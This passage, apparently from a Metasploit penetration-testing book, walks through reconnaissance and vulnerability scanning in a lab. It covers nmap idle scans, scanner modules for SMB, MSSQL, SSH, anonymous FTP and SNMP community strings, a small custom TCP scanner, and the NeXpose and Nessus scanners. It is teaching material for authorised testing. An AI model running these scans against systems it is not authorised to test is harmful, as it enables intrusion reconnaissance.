see a lot of text output as Metasploit sets up all the necessary tables. Other-
wise, the command will return to the msfconsole prompt.
Metasploit provides a number of commands that we can use to interact 
with the database, as you’ll see throughout this book. (For a complete list, 
enter help.) For now, we’ll use db_status to make sure that we’re connected 
correctly.
[Word Count: 77]

msf > db_status
[*] postgresql connected to msfbook
[Word Count: 8]

Everything seems to be set up just fine.
[Word Count: 8]

When you are working with other team members, with various individuals 
scanning at different times and from different locations, it helps to know 
how to run nmap on its own and then import its results into the Framework. 
Next, we’ll examine how to import a basic nmap-generated XML export file 
(generated with nmap’s -oX option) into the Framework.
First, we scan the Windows virtual machine using the -oX option to gener-
ate a Subnet1.xml file:
[Word Count: 75]

nmap -Pn -sS -A -oX Subnet1 192.168.1.0/24
[Word Count: 7]

After generating the XML file, we use the db_import command to import 
it into our database. We can then verify that the import worked by using the 
db_hosts command, which lists the systems entries that have been created, as 
shown here:
[Word Count: 41]

msf > db_connect postgres:toor@127.0.0.1/msf3
msf > db_import Subnet1.xml
msf > db_hosts -c address
[Word Count: 13]

192.168.1.1   
192.168.1.10  
192.168.1.101 
192.168.1.102 
192.168.1.109 
192.168.1.116 
192.168.1.142 
192.168.1.152 
192.168.1.154 
192.168.1.171 
192.168.1.155 
192.168.1.174 
192.168.1.180 
192.168.1.181 
192.168.1.2   
192.168.1.99
[Word Count: 16]

This tells us that we’ve successfully imported the output of our nmap 
scans into Metasploit, as evidenced by the IP addresses populated when we 
run the db_hosts commands.
[Word Count: 28]

msf > use auxiliary/scanner/ip/ipidseq
msf auxiliary(ipidseq) > show options
[Word Count: 9]

Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   GWHOST                      no        The gateway IP address
   INTERFACE                   no        The name of the interface
   LHOST                       no        The local IP address
X 
RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SNAPLEN    65535            yes       The number of bytes to capture
Y 
THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds
[Word Count: 71]

Now let’s set our values and run the module. We’ll set the value for RHO-
STS to 192.168.1.0/24, set THREADS to 50, and then run the scan.
[Word Count: 27]

msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(ipidseq) > set THREADS 50
THREADS => 50
msf auxiliary(ipidseq) > run
[Word Count: 22]

Judging by the results of our scan, we see a number of potential idle hosts 
that we can use to perform idle scanning. We’ll try scanning a host using the 
system at 192.168.1.109 shown at X by using the -sI command line flag to 
specify the idle host:
[Word Count: 48]

msf auxiliary(ipidseq) > nmap -PN -sI 192.168.1.109 192.168.1.155
[*] exec: nmap -PN -sI 192.168.1.109 192.168.1.155
[Word Count: 15]

Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
Interesting ports on 192.168.1.155:
Not shown: 996 closed|filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:E4:59:7C (VMware)
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
msf auxiliary(ipidseq) >
[Word Count: 48]

By using the idle host, we were able to discover a number of open ports 
on our target system without sending a single packet to the system.
[Word Count: 27]

Now that we’ve performed advanced enumeration on our target, let’s connect 
nmap with Metasploit. To do this, we first connect to the msfbook database:
[Word Count: 24]

msf > db_connect postgres:toor@127.0.0.1/msf3
[Word Count: 4]

Now we should be able to enter the db_nmap command from within 
msfconsole to run nmap and have its results automatically stored in our new 
database.
[Word Count: 26]

NOTE
We’ll be attacking only one system in this instance, but you can specify IPs by CIDR 
notation and even ranges (for example, 192.168.1.1/24 or 192.168.1.1–254).
[Word Count: 26]

Host script results:
|_nbstat: NetBIOS name: IHAZSECURITY, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ea:26:7c
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Name: WORKGROUP\IHAZSECURITY
|_smbv2-enabled: Server doesn't support SMBv2 protocol
[Word Count: 32]

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 33.51 seconds
[Word Count: 24]

Notice a series of open ports X, software versions Y, and even a predic-
tion about the target’s operating system Z.
[Word Count: 21]

To check that the results from the scan are stored in the database, we 
run db_services:
[Word Count: 16]

host            port   proto  name          state  info
----            ----   -----  ----          -----  ----
172.16.32.131   135 
tcp  msrpc     
 open   Microsoft Windows RPC
172.16.32.131   139 
tcp  netbios-ssn  open  
172.16.32.131   445 
tcp  microsoft-ds open   Microsoft Windows XP microsoft-ds
172.16.32.131   777 
tcp  unknown    
 open
172.16.32.131   1433
tcp
ms-sql-s
open   Microsoft SQL Server 2005 9.00.1399; RTM
[Word Count: 50]

We’re beginning to develop a picture of our target and exposed ports for 
use as potential attack vectors.
[Word Count: 18]

Let’s conduct a simple scan of a single host using Metasploit’s SYN Port 
Scanner. In the following listing, we start the scan with use scanner/portscan/
syn, set RHOSTS to 192.168.1.155, set THREADS to 50, and then run the scan.
[Word Count: 39]

msf > use scanner/portscan/syn
msf auxiliary(syn) > set RHOSTS 192.168.1.155
RHOSTS => 192.168.1.155
msf auxiliary(syn) > set THREADS 50
THREADS => 50
[Word Count: 22]

msf auxiliary(syn) > run
X [*]  TCP OPEN 192.168.1.155:135
[*]  TCP OPEN 192.168.1.155:139
[*]  TCP OPEN 192.168.1.155:445
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(syn) >
[Word Count: 33]

From the results, you can see at X that ports 135, 139, and 445 are open on 
IP address 192.168.1.155, leveraging the portscan syn module within Metasploit.
[Word Count: 27]

When you are conducting a penetration test, there is no shame in looking 
for an easy win. A targeted scan looks for specific operating systems, services, 
program versions, or configurations that are known to be exploitable and 
that provide an easy door into a target network. For example, it is common 
to scan a target network quickly for the vulnerability MS08-067, as this is 
(still) an extremely common hole that will give you SYSTEM access much 
more quickly than scanning an entire target network for vulnerabilities.
[Word Count: 86]

Metasploit can scour a network and attempt to identify versions of Microsoft 
Windows using its smb_version module.
[Word Count: 17]

NOTE
If you are not familiar with Server Message Block (SMB, a common file-sharing protocol), 
study up a bit on the different protocols and their purposes before you continue. You will 
need to understand basic port information to learn how to attack a system successfully.
[Word Count: 45]

We run the module, list our options, set RHOSTS, and begin scanning:
[Word Count: 12]

msf > use scanner/smb/smb_version
msf auxiliary(smb_version) > show options
[Word Count: 9]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   THREADS  1                yes       The number of concurrent threads
[Word Count: 26]

msf auxiliary(smb_version) > set RHOSTS 192.168.1.155
RHOSTS => 192.168.1.155
msf auxiliary(smb_version) > run
[Word Count: 13]

X [*] 192.168.1.155 is running Windows XP Service Pack 2 (language: English) 
(name:DOOKIE-FA154354) (domain:WORKGROUP)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[Word Count: 27]

As you can see at X the smb_version scanner has pinpointed the operating 
system as Windows XP with Service Pack 2. Because we are scanning only one 
system, we leave THREADS set to 1. If we had been scanning a number of systems, 
such as a class C subnet range, we might consider upping the THREADS using the 
set THREADS number option. The results of this scan are stored in the Metasploit 
database for use at a later time and to be accessed with the db_hosts command.
[Word Count: 87]

msf auxiliary(smb_version) > db_hosts -c address,os_flavor
[Word Count: 6]

address        os_flavor   Svcs  Vulns  Workspace
-------        ---------   ----  -----  ---------
192.168.1.155  Windows XP  3     0      default
msf auxiliary(smb_version) >
[Word Count: 19]

We have discovered a system running Windows XP without having to do 
a full scan of the network. This is a great way to target hosts quickly and quietly 
that are likely to be more vulnerable when our goal is avoid being noticed.
[Word Count: 43]

Hunting for Poorly Configured Microsoft SQL Servers
[Word Count: 7]

msf > use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options
[Word Count: 9]

Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target address range or CIDR identifier
[Word Count: 26]

THREADS    1                yes       The number of concurrent threads
   USERNAME   sa               no        The username to authenticate as
   WORKSPACE                   no        The name of the workspace to report data into
[Word Count: 27]

msf auxiliary(mssql_ping) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(mssql_ping) > set THREADS 255
THREADS => 255
msf auxiliary(mssql_ping) > run
[Word Count: 22]

X [*] SQL Server information for 192.168.1.155:
[*]    ServerName      = V-XPSP2-BARE
Y [*]    InstanceName    = SQLEXPRESS
[*]    IsClustered     = No
Z [*]    Version         = 10.0.1600.22
[ [*]    tcp             = 1433
[Word Count: 30]

As you can see, not only does the scanner locate a MS SQL server at X, 
but it also identifies the instance name at Y, the SQL server version at Z, and 
the TCP port number at [ on which it is listening. Just think of how much 
time this targeted scan for SQL servers would save over running nmap against 
all ports on all machines in a target subnet in search of the elusive TCP port.
[Word Count: 77]

If during your scanning you encounter machines running Secure Shell (SSH), 
you should determine which version is running on the target. SSH is a secure 
protocol, but vulnerabilities in various implementations have been identified. 
You never know when you might get lucky and come across an old machine 
that hasn’t been updated. You can use the Framework’s ssh_version module to 
determine the SSH version running on the target server.
[Word Count: 69]

msf > use scanner/ssh/ssh_version
msf auxiliary(ssh_version) > set THREADS 50
THREADS => 50
msf auxiliary(ssh_version) > run
[Word Count: 17]

[*] 192.168.1.1:22, SSH server version: SSH-2.0-dropbear_0.52
[*] Scanned 044 of 256 hosts (017% complete)
[*] 192.168.1.101:22, SSH server version: SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1
[*] Scanned 100 of 256 hosts (039% complete)
[*] 192.168.1.153:22, SSH server version: SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1
[*] 192.168.1.185:22, SSH server version: SSH-2.0-OpenSSH_4.3
[Word Count: 42]

This output tells us that a few different servers are running with various 
patch levels. This information could prove useful if, for example, we wanted 
to attack a specific version of OpenSSH as found with the ssh_version scan.
[Word Count: 38]

FTP is a complicated and insecure protocol. FTP servers are often the easiest 
way into a target network, and you should always scan for, identify, and finger-
print any FTP servers running on your target.
Next, we scan our XP box for FTP services using the Framework’s 
ftp_version module:
[Word Count: 49]

msf > use scanner/ftp/ftp_version
msf auxiliary(ftp_version) > show options
[Word Count: 9]

Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   FTPPASS    mozilla@example.com  no        The password for the specified username
   FTPUSER    anonymous            no        The username to authenticate as
   RHOSTS                          yes       The target address range or CIDR identifier
   RPORT      21                   yes       The target port
   THREADS    1                    yes       The number of concurrent threads
   WORKSPACE                       no        The name of the workspace to report data into
[Word Count: 60]

msf auxiliary(ftp_version) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(ftp_version) > set THREADS 255
THREADS => 255
msf auxiliary(ftp_version) > run
[Word Count: 22]

X [*] 192.168.1.155:21 FTP Banner: Minftpd ready
[Word Count: 7]

The scanner successfully identifies an FTP server at X. Now let’s see if 
this FTP server allows anonymous logins using the Framework’s scanner/ftp/
anonymous.
[Word Count: 24]

msf > use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(anonymous) > set THREADS 50
THREADS => 50
msf auxiliary(anonymous) > run
[Word Count: 26]

[*] Scanned 045 of 256 hosts (017% complete)
X [*] 192.168.1.155:21 Anonymous READ/WRITE (220 Minftpd ready)
[Word Count: 16]

The scanner reports at X that anonymous access is allowed and that 
anonymous users have both read and write access to the server; in other 
words, we have full access to the remote system and the ability to upload or 
download any file that can be accessed by the FTP server software.
[Word Count: 52]

Simple Network Management Protocol Sweeping
[Word Count: 5]

msf > use use scanner/snmp/snmp_login
msf auxiliary(snmp_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(snmp_login) > set THREADS 50
THREADS => 50
msf auxiliary(snmp_login) > run
[Word Count: 27]

[*] >> progress (192.168.1.0-192.168.1.255) 0/30208...
X [*] 192.168.1.2 'public' 'GSM7224 L2 Managed Gigabit Switch'
Y [*] 192.168.1.2 'private' 'GSM7224 L2 Managed Gigabit Switch'
[*] Auxiliary module execution completed
msf auxiliary(snmp_login) >
[Word Count: 31]

A quick Google search for GSM7224 from the output tells us that the 
scanner has found both the public X and private Y community strings for a 
Netgear switch. This result, believe it or not, has not been staged for this book. 
These are the default factory settings for this switch.
[Word Count: 51]

You will encounter many jaw-dropping situations like these throughout 
your pen testing career, because many administrators simply attach devices to a 
network with all their defaults still in place. The situation is even scarier when 
you find these devices accessible from the Internet within a large corporation.
[Word Count: 47]

#Metasploit
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
Xinclude Msf::Exploit::Remote::Tcp
Yinclude Msf::Auxiliary::Scanner
        def initialize
                super(
                        'Name'           => 'My custom TCP scan',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => 'My quick scanner',
                        'Author'         => 'Your name here',
                        'License'        => MSF_LICENSE
                )
                register_options(
                        [
                                ZOpt::RPORT(12345)
                        ], self.class)
        end
[Word Count: 45]

def run_host(ip)
                connect()
[sock.puts('HELLO SERVER')
                data = sock.recv(1024)
\print_status("Received: #{data} from #{ip}")
                disconnect()
        end
end
[Word Count: 15]

root@bt:/# echo "Hello Metasploit" > banner.txt
root@bt:/# nc -lvnp 12345 < banner.txt
listening on [any] 12345...
[Word Count: 16]

Next, we load up msfconsole, select our scanner module, set its param-
eters, and run it to see if it works.
[Word Count: 21]

msf > use auxiliary/scanner/simple_tcp
msf auxiliary(simple_tcp) > show options
[Word Count: 9]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    12345            yes       The target port
   THREADS  1                yes       The number of concurrent threads
[Word Count: 32]

msf auxiliary(simple_tcp) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(simple_tcp) > run
[Word Count: 13]

[*] Received: Hello Metasploit from 192.168.1.101
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(simple_tcp) >
[Word Count: 22]

Although this is only a simple example, the level of versatility afforded by 
the Metasploit Framework can be of great assistance when you need to get 
some custom code up and running quickly in the middle of a pen test. Hope-
fully, this simple example demonstrates the power of the Framework and 
modular code. But, of course, you don’t have to do everything by hand.
[Word Count: 65]

V U L N E R A B I L I T Y  S C A N N I N G
[Word Count: 21]

A vulnerability scanner is an automated program 
designed to look for weaknesses in computers, com-
puter systems, networks, and applications. The pro-
gram probes a system by sending data to it over a 
network and analyzing the responses received, in an 
effort to enumerate any vulnerabilities present on the 
target by using its vulnerability database as reference.
[Word Count: 57]

root@bt:/opt/framework3/msf3# nc 192.168.1.203 80
GET HTTP 1/1
HTTP/1.1 400 Bad Request
X Server: Microsoft-IIS/5.1
[Word Count: 14]

Figure 4-1: Vulnerability scan results against the target web server
[Word Count: 10]

After installing NeXpose Community, open a web browser and navigate to 
https://<youripaddress>:3780. Accept the NeXpose self-signed certificate, and 
log in using the credentials you created during setup. You should next be 
presented with an interface similar to the one shown in Figure 4-2. (You’ll 
find complete installation instructions for NeXpose at the Rapid7 website.)
On the NeXpose main page, you will notice a number of tabs at the top 
of the interface:
[Word Count: 72]

z
The Assets tab X displays details of computers and other devices on your 
network after they have been scanned.
[Word Count: 20]

z
The Reports tab Y lists vulnerability scan reports after they have been 
generated.
[Word Count: 14]

z
The Vulnerabilities tab Z gives you details on any vulnerabilities discov-
ered during your scans.
[Word Count: 16]

z
The Administration tab [ allows you to configure various options.
[Word Count: 11]

Figure 4-2: The NeXpose’s initial home screen
[Word Count: 7]

Buttons in the main body of the page let you perform common tasks 
such as creating a new site or setting up a new vulnerability scan.
[Word Count: 26]

Prior to running a vulnerability scan with NeXpose, you need to configure a 
site—a logical collection of devices such as a specific subnet, a collection of 
servers, or even a single workstation. These sites will then be scanned by 
NeXpose, and different scan types can be defined for a particular site.
[Word Count: 51]

1.
To create a site, click the New Site button on the NeXpose home page, 
enter a name for your site and a brief description, and then click Next.
[Word Count: 29]

2.
In the devices step, shown in Figure 4-3, you have quite a bit of granular-
ity in defining your targets. You can add a single IP address, address ranges, 
hostnames, and more. You can also declare devices, such as printers, to 
exclude from scans. (Printers frequently don’t take kindly to being scanned. 
We have seen instances in which a simple vulnerability scan caused more 
than one million pages of pure black to be placed in the queue to print!) 
Click Next when you have finished adding and excluding devices.
[Word Count: 90]

3.
At the scan setup step, you can choose from several different scan tem-
plates, such as Discovery Scan and Penetration test; select the scanning 
engine you want to use; or set up an automated scanning schedule. For 
purposes of this initial walk-through, keep the default selections and 
click Next to continue.
[Word Count: 52]

4.
Add credentials for the site you want to scan, if you have them. Credentials 
can help create more accurate and complete results by performing in-
depth enumeration of installed software and system policies on the target.
[Word Count: 37]

5.
On the Credentials tab, click the New Login button, type a username 
and password for the IP address you want to scan, and then click Test 
Login to verify your credentials then save them.
[Word Count: 35]

Figure 4-3: Adding a device to the new NeXpose site
[Word Count: 10]

6.
Last, click Save to complete the New Site wizard and return to the Home 
tab, which should list your newly added site, as shown in Figure 4-4.
[Word Count: 28]

Figure 4-4: The Home tab shows the newly configured site.
[Word Count: 10]

With your new site configured, you are now set to configure your first scan:
[Word Count: 14]

1.
Click the New Manual Scan button shown in Figure 4-4. You should see 
the Start New Scan dialog shown in Figure 4-5, which prompts you for the 
assets you want to scan or exclude. In this example, we are scanning our 
default Windows XP system.
[Word Count: 46]

2.
Double-check your target IP address to be sure that you’re not about to 
scan the wrong device or network inadvertently, and click the Start Now 
button to begin.
[Word Count: 29]

Figure 4-5: The NeXpose scan configuration dialog
[Word Count: 7]

3.
NeXpose should dynamically refresh the page as the scan progresses. 
Wait until the status for both Scan Progress and Discovered Assets shows 
Completed, as shown in Figure 4-6. Under the Scan Progress section, you 
can see that our single scanned device has 268 vulnerabilities detected, 
and under Discovered Assets, you are provided with more information 
about the target such as the device name and its operating system. Now 
click the Reports tab.
[Word Count: 73]

Figure 4-6: The completed NeXpose scan and report
[Word Count: 8]

If this is your first time running NeXpose and you have completed only one 
scan, the Reports tab should show that you have generated no reports.
[Word Count: 26]

1.
Click New Report, as shown in Figure 4-7, to start the New Report wizard.
[Word Count: 15]

2.
Enter a friendly name, and then in the Report format field, select NeXpose 
Simple XML Export, as shown in Figure 4-8, so that you will be able to 
import the scan results into Metasploit. You can select from different report 
templates and configure the time zone if you happen to be conducting 
your pen test on the road. Click Next when you are ready to proceed.
[Word Count: 67]

Figure 4-8: Selecting a name and format for the report
[Word Count: 10]

3.
In the subsequent window, add the devices you want to be included in 
the report by clicking Select Sites to add your scanned target range, as 
shown in Figure 4-9. Then click Save.
[Word Count: 34]

Figure 4-9: Selecting the site for inclusion in the report
[Word Count: 10]

4.
In the Select Devices dialog, select the targets to include in your report 
and then click Save.
[Word Count: 18]

5.
Back in the Report Configuration wizard, click Save to accept the remaining 
defaults for the report. The Reports tab should now list the newly created 
report, as shown in Figure 4-10. (Be sure to save the report file so that 
you can use it with the Framework.)
[Word Count: 48]

Figure 4-10: The Reports tab lists your reports.
[Word Count: 8]

Importing Your Report into the Metasploit Framework
[Word Count: 7]

Having completed a full vulnerability scan with NeXpose, you need to import 
the results into Metasploit. But before you do, you must create a new database 
from msfconsole by issuing db_connect. After creating that database you’ll import 
the NeXpose XML using the db_import command. Metasploit will automati-
cally detect that the file is from NeXpose and import the scanned host. You 
can then verify that the import was successful by running the db_hosts command. 
(These steps are shown in the following listing.) As you can see at X, Metasploit 
knows about the 268 vulnerabilities that your scan picked up.
[Word Count: 99]

msf > db_connect postgres:toor@127.0.0.1/msf3
msf > db_import /tmp/host_195.xml
[*] Importing 'NeXpose Simple XML' data
[*] Importing host 192.168.1.195
[*] Successfully imported /tmp/host_195.xml
[Word Count: 22]

address        Svcs  Vulns  Workspace
-------        ----  -----  ---------
192.168.1.195  8    268X default
[Word Count: 12]

To display the full details of the vulnerabilities imported into Metasploit, 
including Common Vulnerabilities and Exposures (CVE) numbers and other 
references, run the following:
[Word Count: 24]

As you can see, running an overt vulnerability scan with full credentials 
can provide an amazing amount of information—268 vulnerabilities found
[Word Count: 21]

in this case. But, of course, this has been a very noisy scan, likely to attract lots 
of attention. These types of vulnerability scans are best used in a pen test 
where being stealthy is not required.
[Word Count: 37]

Running NeXpose from the web GUI is great for fine-tuning vulnerability 
scans and generating reports, but if you prefer to remain in msfconsole, you 
can still run full vulnerability scans with the NeXpose plug-in included in 
Metasploit.
To demonstrate the difference in results between a credentialed and non-
credentialed scan, we will run a scan from with Metasploit without specifying 
a username and password for the target system. Before you begin, delete any 
existing database with db_destroy, create a new database in Metasploit with 
db_connect, and then load the NeXpose plug-in with load nexpose as shown next:
[Word Count: 97]

msf > db_destroy postgres:toor@127.0.0.1/msf3
[*] Warning: You will need to enter the password at the prompts below
Password:
[Word Count: 18]

msf > db_connect postgres:toor@127.0.0.1/msf3
[Word Count: 4]

[*] NeXpose integration has been activated
[*] Successfully loaded plugin: nexpose
[Word Count: 11]

With the NeXpose plug-in loaded, have a look at the commands loaded 
specifically for the vulnerability scanner by entering the help command. You 
should see a series of new commands at the top of the listing specific to run-
ning NeXpose.
[Word Count: 41]

Before running your first scan from msfconsole, you will need to connect 
to your NeXpose installation. Enter nexpose_connect -h to display the usage 
required to connect; add your username, password, and host address; and 
accept the SSL certificate warning by adding ok to the end of the connect 
string:
[Word Count: 49]

msf > nexpose_connect -h
[*] Usage:
[*]        nexpose_connect username:password@host[:port] <ssl-confirm>
[*]         -OR-
[*]        nexpose_connect username password host port <ssl-confirm>
msf > nexpose_connect dookie:s3cr3t@192.168.1.206 ok
[*] Connecting to NeXpose instance at 192.168.1.206:3780 with username dookie...
[Word Count: 34]

Now enter nexpose_scan followed by the target IP address to initiate a scan, as 
shown next. In this example, we are scanning a single IP address, but you
[Word Count: 28]

could also pass a range of hosts to the scanner (192.168.1.1-254) or a subnet 
in Classless Inter-Domain Routing (CIDR) notation (192.168.1.0/24).
[Word Count: 21]

msf > nexpose_scan 192.168.1.195
[*] Scanning 1 addresses with template pentest-audit in sets of 32
[*] Completed the scan of 1 addresses
msf >
[Word Count: 24]

After the NeXpose scan completes, the database you created earlier 
should contain the results of the vulnerability scan. To view the results, enter 
db_hosts, as shown next. (In this example, the output has been trimmed by filter-
ing on the address column.)
[Word Count: 42]

address        Svcs  Vulns  Workspace
-------        ----  -----  ---------
192.168.1.195  8    7     default
[Word Count: 12]

As you can see, NeXpose has discovered seven vulnerabilities. Run db_vulns 
to display the vulnerabilities found:
[Word Count: 16]

Although this scan has found significantly fewer than the 268 vulnerabilities 
discovered with our prior use of NeXpose through the GUI with credentials, 
you should have enough vulnerabilities here to get a great head start on 
exploiting the system.
[Word Count: 39]

The Nessus vulnerability scanner from Tenable Security (http://www.tenable
.com/) is one of the most widely used vulnerability scanners. Metasploit’s 
Nessus plug-in lets you launch scans and pull information from Nessus scans 
via the console, but in the example that follows, we’ll import Nessus scan 
results independently. Using Nessus 4.4.1 with a free Home Feed, we’ll run 
this scan against the same target we’ll use throughout this chapter, with 
known credentials. In these early stages of a penetration test, the more 
tools you can use to fine-tune your future attacks, the better.
[Word Count: 91]

After you have downloaded and installed Nessus, open your web browser and 
navigate to https://<youripaddress>:8834, accept the certificate warning, and 
log into Nessus using the credentials you created during installation. You 
should see the main Nessus window, as shown in Figure 4-11.
[Word Count: 42]

On login, you will see the Reports section, where any prior vulnerability 
scans should be listed. Along the top of the interface, you should see the Scans 
tab, where you can create and view scanning tasks; the Policies tab, where you 
configure Nessus to include various plug-ins you want to use in your scans; 
and the Users tab, where you can add user accounts to the Nessus server.
[Word Count: 68]

Before beginning a scan, you first need to create a Nessus scan policy. On the 
Policies tab, click the green Add button to open the policy configuration win-
dow shown in Figure 4-12.
[Word Count: 33]

Figure 4-12: The Nessus Policies configuration window
[Word Count: 7]

You’ll see many available options, all of which can be found in Nessus’s 
documentation.
[Word Count: 14]

1.
Enter a name for the scan, as shown in Figure 4-13. We will use the name 
The_Works in our example to have Nessus run all of its checks. Then 
click Next.
[Word Count: 32]

2.
As with the NeXpose scan conducted earlier, we will configure this scan 
to use Windows login credentials to get a more complete picture of the 
vulnerabilities present on the target system. Enter the login credentials 
for your target system and click Next.
[Word Count: 43]

Figure 4-13: The Nessus General settings
[Word Count: 6]

3.
On the Plugins page, you can choose from a large variety of Nessus plug-
ins for Windows, Linux, BSD, and more. If, during a scan, you know you 
are going to scan only Windows-based systems, for example, you could 
deselect many of these plug-ins for your first run-through; for now, click 
Enable All (shown in the lower-right corner of Figure 4-14) and then 
click Next.
[Word Count: 66]

Figure 4-14: Selecting Nessus scan plug-ins
[Word Count: 6]

4.
The final step in setting up the new policy is the Preferences page. Here, 
you can direct Nessus not to scan fragile devices such as network printers, 
configure it to store results in an external database, provide login creden-
tials, and more. When you are done with your selections, click Submit to 
save the new policy. Your newly added policy should be displayed under 
Policies, as shown in Figure 4-15.
[Word Count: 71]

Figure 4-15: The newly added policy in Nessus
[Word Count: 8]

After you have created a scan policy, you are ready to configure a scan. Begin 
by selecting the Scans tab, and then click the Add button to open the scan 
configuration window. Most Nessus configuration is set in its scan policies, so 
when you’re setting up a scan, enter a name for the scan, choose a policy, and 
enter the scan targets, as shown in Figure 4-16.
[Word Count: 67]

In our example, we are scanning only one host, but you can also enter IP 
address ranges in CIDR notation or even upload a file containing the addresses 
of the targets you want to scan. When you are satisfied with the scan configu-
ration, click Launch Scan.
[Word Count: 47]

After the scan is complete, it will no longer appear under Scans, and you 
should find a new entry under the Reports tab listing the name of the scan, 
its status, and when it was last updated. Select the report and click Browse to
[Word Count: 44]

open a summary page of the scan that shows the severity levels of the vulner-
abilities found, as shown in Figure 4-17.
[Word Count: 22]

Figure 4-17: Our Nessus scan report summary
[Word Count: 7]

NOTE
Bear in mind that because this scan was run with Windows credentials, Nessus will 
find many more vulnerabilities than it would with an anonymous scan.
[Word Count: 26]

Importing Results into the Metasploit Framework
[Word Count: 6]

Now let’s import our results into the Framework.
[Word Count: 8]

1.
Click the Download Report button on the Reports tab to save the results 
to your hard drive. The default file format for Nessus reports, .nessus, can 
be parsed by Metasploit, so click Submit when prompted to select the 
default format.
[Word Count: 41]

2.
Load msfconsole, create a new database with db_connect, and import the 
Nessus results file by entering db_import followed by the report filename.
[Word Count: 23]

msf > db_connect postgres:toor@127.0.0.1/msf3
msf > db_import /tmp/nessus_report_Host_195.nessus
[*] Importing 'Nessus XML (v2)' data
[*] Importing host 192.168.1.195
[Word Count: 18]

3.
To verify that the scanned host and vulnerability data was imported 
properly, enter db_hosts as shown next. This should output a brief list-
ing with the target IP address, the number of services detected, and the 
number of vulnerabilities found by Nessus.
[Word Count: 43]

Hosts
=====
address        svcs  vulns
-------        ----  -----
192.168.1.195  18    345
[Word Count: 11]

4.
For a complete listing of the vulnerability data that was imported into 
Metasploit, enter db_vulns without any switches, as shown here:
[Word Count: 22]

msf > db_vulns
[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 
name=NSS-10916 refs=OSVDB-755
[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 
name=NSS-10915 refs=OSVDB-754
[*] Time: Wed Mar 09 03:40:11 UTC 2011 Vuln: host=192.168.1.195 
name=NSS-10913 refs=OSVDB-752
[*] Time: Wed Mar 09 03:40:12 UTC 2011 Vuln: host=192.168.1.195 
name=NSS-10114 refs=CVE-1999-0524,OSVDB-94,CWE-200
[*] Time: Wed Mar 09 03:40:13 UTC 2011 Vuln: host=192.168.1.195
[Word Count: 61]

name=NSS-11197 refs=CVE-2003-0001,BID-6535
[Word Count: 2]

At the end of your pen test, having these references available can be of 
great assistance when you’re writing the report for your client.
[Word Count: 24]

Scanning with Nessus from Within Metasploit
[Word Count: 6]

During those times when you don’t feel like leaving the comfort of the 
command line, you can use the Nessus Bridge plug-in (http://blog.zate.org/
nessus-plugin-dev/) by Zate within Metasploit. The Nessus Bridge allows you to 
control Nessus completely through the Metasploit Framework, run scans, 
interpret results, and launch attacks based on the vulnerabilities identified 
through Nessus.
[Word Count: 55]

1.
As in the preceding examples, first destroy the existing database with the 
db_destroy command and create a new one using db_connect.
[Word Count: 22]

2.
Load the Nessus plug-in by running load nessus, as shown here:
[Word Count: 12]

msf > db_destroy postgres:toor@127.0.0.1/msf3
[*] Warning: You will need to enter the password at the prompts below
Password:
[Word Count: 18]

msf > db_connect postgres:toor@127.0.0.1/msf3
msf > load nessus
[*] Nessus Bridge for Metasploit 1.1
[+] Type nessus_help for a command listing
[+] Exploit Index - (/root/.msf3/nessus_index) -  is valid.
[*] Successfully loaded plugin: Nessus
[Word Count: 34]

3.
Running the command nessus_help will display all of the commands that 
the plug-in supports. The Bridge undergoes regular development and 
updates, so it is a good idea to check the help output periodically to see 
what new features, if any, have been added.
[Word Count: 44]

4.
Before starting a scan with the Bridge, you first need to authenticate to 
your Nessus server using nessus_connect, as shown here:
[Word Count: 22]

msf > nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok
[*] Connecting to https://192.168.1.101:8834/ as dookie
[*] Authenticated
[Word Count: 13]

5.
As with the GUI version of Nessus, you need to initiate a scan using a 
defined policy by its policy ID number. To list the available scan policies 
on the server, use nessus_policy_list:
[Word Count: 34]

msf > nessus_policy_list
[+] Nessus Policy List
[Word Count: 7]

ID  Name       
Comments
--  ----       
--------
-4
Internal Network Scan
-3
Web App Tests
-2
Prepare for PCI DSS audits
-1
External Network Scan
2
The_Works
[Word Count: 26]

6.
Take note of the policy ID you want to use for your scan, and then launch 
a new scan with nessus_scan_new followed by the policy number, a name 
for your scan, and your target IP address as shown next:
[Word Count: 40]

